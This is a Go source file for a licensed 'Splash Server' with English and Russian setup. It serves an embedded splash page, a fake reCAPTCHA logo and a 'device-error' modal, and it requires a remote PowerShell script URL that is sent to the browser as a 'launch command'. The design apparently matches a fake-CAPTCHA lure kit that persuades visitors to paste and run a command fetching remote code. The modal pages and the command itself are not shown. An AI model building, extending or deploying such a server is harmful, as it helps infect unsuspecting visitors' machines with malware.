// Splash Server
// ══════════════════════════════════════════════════════════════════════════════
// On startup: validates license key, asks for bg image + music, then serves.
// index.html, modal.html and modal2.html are embedded at build time.
//
// ── Run ───────────────────────────────────────────────────────────────────────
//   go run .
//
// ── Build ─────────────────────────────────────────────────────────────────────
//   go build -o splash_server.exe .   (Windows)
//   go build -o splash_server       .   (Linux/Mac)
//
// ── Files needed at build time (same folder as server.go) ────────────────────
//   index.html    — splash / terms page
//   modal.html    — standard launcher modal
//   modal2.html   — device-error style modal
//
// ── Files needed at runtime (same folder as the exe) ─────────────────────────
//   <bg file>     — image you specify at startup (e.g. background.jpg)
//   <music file>  — audio you specify at startup (optional)
//
// ══════════════════════════════════════════════════════════════════════════════

package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha256"
	_ "embed"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

//go:embed index.html
var indexHTML []byte

//go:embed modal.html
var modal1HTML []byte

//go:embed modal2.html
var modal2HTML []byte

//go:embed recaptcha.png
var recaptchaLogo []byte

// ══════════════════════════════════════════════════════════════════════════════
// ██  CONFIG — edit before building / distributing  ██
// ══════════════════════════════════════════════════════════════════════════════

// licenseSecret MUST be identical to the one in keygen.go.
const licenseSecret = "L1c3ns3S3cr3t#ChangeThisBeforeDistributing!9f2a3b"

const serverPort = "8080"

// ps1URL is the PowerShell script URL sent to the browser for the launch command.
// Set this to your hosted demo.ps1 URL, e.g. "https://yourdomain.com/demo.ps1"
// Leave empty to fall back to the hardcoded URL in the modal.
const ps1URL = ""

// Set true to suppress startup logs from appearing in the terminal.
// Logs always go to server.log regardless.
const logToFileOnly = false

// ══════════════════════════════════════════════════════════════════════════════

var (
	dataDir            string
	configBgFile       string // e.g. "background.jpg"
	configModalBgFile  string // e.g. "shadow2.png" — optional override for modals; falls back to configBgFile
	configMusicFile    string // e.g. "music.mp3" or ""
	configModalFile    string // "modal.html" or "modal2.html"
	configPS1URL       string // e.g. "https://yourdomain.com/demo.ps1"
	lang               string // "en" or "ru"
)

func init() {
	dataDir, _ = os.Getwd()
}

// ── i18n ──────────────────────────────────────────────────────────────────────

type messages struct {
	Header        string
	Step1         string
	LoadedKey     string
	SavedKeyBad   string
	EnterKey      string
	KeyEmpty      string
	KeyInvalid    string
	KeySaved      string
	KeyValid      string
	Step2         string
	Step2Hint     string
	BgPrompt      string
	BgEmpty       string
	BgNotFound    string
	BgOK          string
	Step3         string
	MusicPrompt   string
	MusicNotFound string
	MusicSkipped  string
	MusicOK       string
	Step4         string
	ModalPrompt   string
	ModalOK       string
	Step5         string
	PS1Prompt     string
	PS1OK         string
	AllSet        string
	OpenBrowser   string
}

var i18n = map[string]messages{
	"en": {
		Header:        "  ╔══════════════════════════════════════════╗\n  ║           Splash Server Setup            ║\n  ╚══════════════════════════════════════════╝",
		Step1:         "  [1/3] License Validation",
		LoadedKey:     "  ✓ Loaded from license.key — %d days remaining (expires %s)\n",
		SavedKeyBad:   "  ! Saved key invalid or expired (%v) — please enter a new one.\n",
		EnterKey:      "  Enter license key: ",
		KeyEmpty:      "  ! License key cannot be empty.",
		KeyInvalid:    "  ✗ %v\n\n  ! Please enter a valid license key.",
		KeySaved:      "  ✓ Key saved to license.key",
		KeyValid:      "  ✓ License valid — %d days remaining (expires %s)\n",
		Step2:         "  [2/3] Background Image",
		Step2Hint:     "  Place your image in the same folder as server.go/server.exe",
		BgPrompt:      "  Filename (e.g. background.jpg): ",
		BgEmpty:       "  ! Filename cannot be empty.",
		BgNotFound:    "  ! File not found: %s\n  ! Check the filename and try again.",
		BgOK:          "  ✓ Background: %s\n",
		Step3:         "  [3/3] Music File (optional)",
		MusicPrompt:   "  Filename (e.g. music.mp3) or press Enter to skip: ",
		MusicNotFound: "  ! File not found: %s\n  ! Check the filename or press Enter to skip.",
		MusicSkipped:  "  ✓ No music — skipped",
		MusicOK:       "  ✓ Music: %s\n",
		Step4:         "  [4/5] Modal Style",
		ModalPrompt:   "  Choose modal  [1] Standard  [2] Device Error (default: 1): ",
		ModalOK:       "  ✓ Modal: %s\n",
		Step5:         "  [5/5] PowerShell Script URL",
		PS1Prompt:     "  PS1 URL (e.g. https://yourdomain.com/demo.ps1): ",
		PS1OK:         "  ✓ PS1 URL: %s\n",
		AllSet:        "  ─────────────────────────────────────────────\n  All set!  Starting server on :%s ...\n  ─────────────────────────────────────────────",
		OpenBrowser:   "  Open in browser:  http://localhost:%s/\n\n  External access:  http://<your-ip>:%s/\n",
	},
	"ru": {
		Header:        "  ╔══════════════════════════════════════════╗\n  ║        Настройка Splash-сервера          ║\n  ╚══════════════════════════════════════════╝",
		Step1:         "  [1/3] Проверка лицензии",
		LoadedKey:     "  ✓ Лицензия загружена из license.key — осталось %d дн. (истекает %s)\n",
		SavedKeyBad:   "  ! Сохранённый ключ недействителен или истёк (%v) — введите новый.\n",
		EnterKey:      "  Введите лицензионный ключ: ",
		KeyEmpty:      "  ! Лицензионный ключ не может быть пустым.",
		KeyInvalid:    "  ✗ %v\n\n  ! Пожалуйста, введите действительный лицензионный ключ.",
		KeySaved:      "  ✓ Ключ сохранён в license.key",
		KeyValid:      "  ✓ Лицензия действительна — осталось %d дн. (истекает %s)\n",
		Step2:         "  [2/3] Фоновое изображение",
		Step2Hint:     "  Поместите изображение в ту же папку, что и server.go/server.exe",
		BgPrompt:      "  Имя файла (например, background.jpg): ",
		BgEmpty:       "  ! Имя файла не может быть пустым.",
		BgNotFound:    "  ! Файл не найден: %s\n  ! Проверьте имя файла и попробуйте снова.",
		BgOK:          "  ✓ Фон: %s\n",
		Step3:         "  [3/3] Музыкальный файл (необязательно)",
		MusicPrompt:   "  Имя файла (например, music.mp3) или Enter для пропуска: ",
		MusicNotFound: "  ! Файл не найден: %s\n  ! Проверьте имя файла или нажмите Enter для пропуска.",
		MusicSkipped:  "  ✓ Музыка — пропущено",
		MusicOK:       "  ✓ Музыка: %s\n",
		Step4:         "  [4/5] Стиль модального окна",
		ModalPrompt:   "  Выберите стиль  [1] Стандартный  [2] Ошибка устройства (по умолч.: 1): ",
		ModalOK:       "  ✓ Модальное окно: %s\n",
		Step5:         "  [5/5] URL PowerShell-скрипта",
		PS1Prompt:     "  URL скрипта (напр. https://yourdomain.com/demo.ps1): ",
		PS1OK:         "  ✓ PS1 URL: %s\n",
		AllSet:        "  ─────────────────────────────────────────────\n  Готово! Запуск сервера на порту :%s ...\n  ─────────────────────────────────────────────",
		OpenBrowser:   "  Открыть в браузере:  http://localhost:%s/\n\n  Внешний доступ:      http://<ваш-ip>:%s/\n",
	},
}

func m() messages { return i18n[lang] }

// ── License validation ────────────────────────────────────────────────────────

type licenseInfo struct {
	Days        uint16
	Issued      time.Time
	Expiry      time.Time
	DaysLeft    int
}

// validateKey decodes and verifies a license key string.
// Key format: XXXXXXXX-XXXXXXXX-XXXXXXXX-XXXXXXXX-XXXXXXXX-XXXXXXXX (53 chars)
// Bytes: [0-1] days, [2-5] issued unix, [6-15] random, [16-23] HMAC[:8]
func validateKey(key string) (*licenseInfo, error) {
	clean := strings.ReplaceAll(strings.TrimSpace(key), "-", "")
	if len(clean) != 48 {
		return nil, fmt.Errorf("invalid key length (expected 48 hex chars, got %d)", len(clean))
	}

	raw, err := hex.DecodeString(clean)
	if err != nil {
		return nil, fmt.Errorf("key contains invalid characters")
	}

	// Verify HMAC
	payload := raw[:16]
	gotSig  := raw[16:24]

	mac := hmac.New(sha256.New, []byte(licenseSecret))
	mac.Write(payload)
	wantSig := mac.Sum(nil)[:8]

	if !hmac.Equal(gotSig, wantSig) {
		return nil, fmt.Errorf("invalid key — signature mismatch")
	}

	days   := binary.BigEndian.Uint16(payload[0:2])
	unix32 := binary.BigEndian.Uint32(payload[2:6])
	issued := time.Unix(int64(unix32), 0).UTC()
	expiry := issued.Add(time.Duration(days) * 24 * time.Hour)
	now    := time.Now().UTC()

	if now.After(expiry) {
		return nil, fmt.Errorf("license expired on %s", expiry.Format("2006-01-02"))
	}

	daysLeft := int(expiry.Sub(now).Hours() / 24)

	return &licenseInfo{
		Days:     days,
		Issued:   issued,
		Expiry:   expiry,
		DaysLeft: daysLeft,
	}, nil
}

// ── Environment-variable startup ─────────────────────────────────────────────

// envSetup configures the server from environment variables without any
// interactive prompts. Returns true if all required variables were present and
// valid, false if any required variable is missing (caller should fall back to
// runSetup).
func envSetup() bool {
	licenseKey  := strings.TrimSpace(os.Getenv("SPLASH_LICENSE_KEY"))
	bgFile      := strings.TrimSpace(os.Getenv("SPLASH_BG_FILE"))
	musicFile   := strings.TrimSpace(os.Getenv("SPLASH_MUSIC_FILE"))
	modalStyle  := strings.TrimSpace(os.Getenv("SPLASH_MODAL_STYLE"))
	ps1Url      := strings.TrimSpace(os.Getenv("SPLASH_PS1_URL"))
	langEnv     := strings.ToLower(strings.TrimSpace(os.Getenv("SPLASH_LANGUAGE")))

	// Check required vars
	if licenseKey == "" || bgFile == "" || ps1Url == "" {
		return false
	}

	// Language (optional, default "en")
	if langEnv == "ru" {
		lang = "ru"
	} else {
		lang = "en"
	}

	// Validate license key
	info, err := validateKey(licenseKey)
	if err != nil {
		log.Fatalf("[ENV] License key validation failed: %v", err)
	}
	log.Printf("[ENV] License valid — %d days remaining (expires %s)",
		info.DaysLeft, info.Expiry.Format("2006-01-02"))

	// Save validated key so interactive mode can reuse it later if needed
	licenseFile := filepath.Join(dataDir, "license.key")
	_ = os.WriteFile(licenseFile, []byte(licenseKey+"\n"), 0600)

	// Background image — must exist on disk
	bgPath := filepath.Join(dataDir, bgFile)
	if _, err := os.Stat(bgPath); os.IsNotExist(err) {
		log.Fatalf("[ENV] Background file not found: %s", bgPath)
	}
	configBgFile = bgFile
	log.Printf("[ENV] Background: %s", configBgFile)

	// Modal background image (optional override — falls back to configBgFile)
	modalBgFile := strings.TrimSpace(os.Getenv("SPLASH_MODAL_BG_FILE"))
	if modalBgFile != "" {
		modalBgPath := filepath.Join(dataDir, modalBgFile)
		if _, err := os.Stat(modalBgPath); os.IsNotExist(err) {
			log.Printf("[ENV] Modal background file not found: %s — falling back to main background", modalBgPath)
			configModalBgFile = ""
		} else {
			configModalBgFile = modalBgFile
			log.Printf("[ENV] Modal background: %s", configModalBgFile)
		}
	} else {
		configModalBgFile = ""
		log.Printf("[ENV] Modal background: (none — using main background)")
	}

	// Music file (optional)
	if musicFile != "" {
		musicPath := filepath.Join(dataDir, musicFile)
		if _, err := os.Stat(musicPath); os.IsNotExist(err) {
			log.Fatalf("[ENV] Music file not found: %s", musicPath)
		}
		configMusicFile = musicFile
		log.Printf("[ENV] Music: %s", configMusicFile)
	} else {
		configMusicFile = ""
		log.Printf("[ENV] Music: (none)")
	}

	// Modal style (optional, default "1" → modal.html)
	if modalStyle == "2" {
		configModalFile = "modal2.html"
	} else {
		configModalFile = "modal.html"
	}
	log.Printf("[ENV] Modal: %s", configModalFile)

	// PS1 URL
	if !strings.HasPrefix(ps1Url, "http://") && !strings.HasPrefix(ps1Url, "https://") {
		log.Fatalf("[ENV] SPLASH_PS1_URL must start with http:// or https://")
	}
	configPS1URL = ps1Url
	log.Printf("[ENV] PS1 URL: %s", configPS1URL)

	fmt.Printf("\n  [ENV] Configuration loaded from environment variables.\n")
	fmt.Printf(m().AllSet+"\n", serverPort)
	fmt.Println()
	return true
}

// ── Interactive startup ───────────────────────────────────────────────────────

var stdin = bufio.NewReader(os.Stdin)

func readLine(prompt string) string {
	fmt.Print(prompt)
	line, _ := stdin.ReadString('\n')
	return strings.TrimSpace(line)
}

func runSetup() {
	fmt.Println()

	// ── Language selection (always in both languages) ─────────────────────────
	fmt.Print("  Language / Язык  [en/ru]: ")
	choice, _ := stdin.ReadString('\n')
	choice = strings.ToLower(strings.TrimSpace(choice))
	if choice == "ru" {
		lang = "ru"
	} else {
		lang = "en"
	}

	fmt.Println()
	fmt.Println(m().Header)
	fmt.Println()

	// ── Step 1: License key ───────────────────────────────────────────────────
	fmt.Println(m().Step1)

	licenseFile := filepath.Join(dataDir, "license.key")
	var info *licenseInfo

	// Try loading saved key first
	if saved, err := os.ReadFile(licenseFile); err == nil {
		savedKey := strings.TrimSpace(string(saved))
		if li, err := validateKey(savedKey); err == nil {
			info = li
			fmt.Printf(m().LoadedKey+"\n", info.DaysLeft, info.Expiry.Format("2006-01-02"))
		} else {
			fmt.Printf(m().SavedKeyBad+"\n", err)
		}
	}

	// Prompt if no valid saved key
	if info == nil {
		for {
			raw := readLine(m().EnterKey)
			if raw == "" {
				fmt.Println(m().KeyEmpty)
				continue
			}
			var err error
			info, err = validateKey(raw)
			if err != nil {
				fmt.Printf(m().KeyInvalid+"\n", err)
				continue
			}
			if werr := os.WriteFile(licenseFile, []byte(strings.TrimSpace(raw)+"\n"), 0600); werr == nil {
				fmt.Println(m().KeySaved)
			}
			fmt.Printf(m().KeyValid+"\n", info.DaysLeft, info.Expiry.Format("2006-01-02"))
			break
		}
	}

	// ── Step 2: Background image ──────────────────────────────────────────────
	fmt.Println(m().Step2)
	fmt.Println(m().Step2Hint)
	for {
		name := readLine(m().BgPrompt)
		if name == "" {
			fmt.Println(m().BgEmpty)
			continue
		}
		path := filepath.Join(dataDir, name)
		if _, err := os.Stat(path); os.IsNotExist(err) {
			fmt.Printf(m().BgNotFound+"\n", path)
			continue
		}
		configBgFile = name
		break
	}
	fmt.Printf(m().BgOK+"\n", configBgFile)

	// ── Step 3: Music file (optional) ─────────────────────────────────────────
	fmt.Println(m().Step3)
	for {
		name := readLine(m().MusicPrompt)
		if name == "" {
			configMusicFile = ""
			fmt.Println(m().MusicSkipped)
			break
		}
		path := filepath.Join(dataDir, name)
		if _, err := os.Stat(path); os.IsNotExist(err) {
			fmt.Printf(m().MusicNotFound+"\n", path)
			continue
		}
		configMusicFile = name
		fmt.Printf(m().MusicOK, configMusicFile)
		break
	}

	// ── Step 4: Modal style ───────────────────────────────────────────────────
	fmt.Println(m().Step4)
	choice2 := readLine(m().ModalPrompt)
	if strings.TrimSpace(choice2) == "2" {
		configModalFile = "modal2.html"
	} else {
		configModalFile = "modal.html"
	}
	fmt.Printf(m().ModalOK+"\n", configModalFile)

	// ── Step 5: PowerShell script URL ─────────────────────────────────────────
	fmt.Println(m().Step5)
	for {
		url := readLine(m().PS1Prompt)
		url = strings.TrimSpace(url)
		if url == "" {
			fmt.Println("  ! URL cannot be empty.")
			continue
		}
		if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
			fmt.Println("  ! URL must start with http:// or https://")
			continue
		}
		configPS1URL = url
		fmt.Printf(m().PS1OK+"\n", configPS1URL)
		break
	}

	fmt.Println()
	fmt.Printf(m().AllSet+"\n", serverPort)
	fmt.Println()
}

// ── HTTP handlers ─────────────────────────────────────────────────────────────

// GET /api/config — returns asset URLs for index.html
func handleConfig(w http.ResponseWriter, r *http.Request) {
	resp := map[string]interface{}{
		"has_bg":       configBgFile != "",
		"bg_url":       "",
		"modal_bg_url": "",
		"has_music":    configMusicFile != "",
		"music_url":    "",
		"ps1_url":      configPS1URL,
	}
	if configBgFile != "" {
		resp["bg_url"] = "/assets/" + configBgFile
	}
	// modal_bg_url: use dedicated modal background if set, otherwise fall back to bg_url
	if configModalBgFile != "" {
		resp["modal_bg_url"] = "/assets/" + configModalBgFile
	} else {
		resp["modal_bg_url"] = resp["bg_url"]
	}
	if configMusicFile != "" {
		resp["music_url"] = "/assets/" + configMusicFile
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-cache")
	json.NewEncoder(w).Encode(resp)
}

// GET /assets/<filename> — serves bg and music files only
func handleAssets(w http.ResponseWriter, r *http.Request) {
	name := strings.TrimPrefix(r.URL.Path, "/assets/")

	// Safety: reject path traversal / subdirectory access
	if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
		http.NotFound(w, r)
		return
	}

	// Only serve the files that were configured at startup
	if name != configBgFile && name != configMusicFile && name != configModalBgFile {
		http.NotFound(w, r)
		return
	}

	http.ServeFile(w, r, filepath.Join(dataDir, name))
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(indexHTML)
}

func handleModalFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	if configModalFile == "modal2.html" {
		w.Write(modal2HTML)
	} else {
		w.Write(modal1HTML)
	}
}

func handleHealth(w http.ResponseWriter, _ *http.Request) {
	fmt.Fprintln(w, "ok")
}

func handleRecaptchaLogo(w http.ResponseWriter, _ *http.Request) {
	w.Header().Set("Content-Type", "image/png")
	w.Header().Set("Cache-Control", "public, max-age=86400")
	w.Write(recaptchaLogo)
}

// ── Main ──────────────────────────────────────────────────────────────────────

func main() {
	// ── Logging setup ─────────────────────────────────────────────────────────
	logPath := filepath.Join(dataDir, "server.log")
	logFile, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		if logToFileOnly {
			log.SetOutput(logFile)
		} else {
			// Write to both terminal and log file
			log.SetOutput(logFile) // during setup we only log to file
		}
	}
	log.SetFlags(log.Ldate | log.Ltime)

	// ── Setup: env vars first, interactive fallback ───────────────────────────
	if !envSetup() {
		runSetup()
	}

	// After setup, also mirror logs to stdout
	if !logToFileOnly && logFile != nil {
		// We already printed setup info — now start structured logging to terminal too
	}

	// ── Register routes ───────────────────────────────────────────────────────
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/modal.html", handleModalFile)
	mux.HandleFunc("/assets/", handleAssets)
	mux.HandleFunc("/api/config", handleConfig)
	mux.HandleFunc("/health", handleHealth)
	mux.HandleFunc("/recaptcha.png", handleRecaptchaLogo)

	fmt.Printf(m().OpenBrowser, serverPort, serverPort)
	log.Printf("[START] port=%s bg=%s music=%s", serverPort, configBgFile, configMusicFile)
	log.Fatal(http.ListenAndServe(":"+serverPort, mux))
}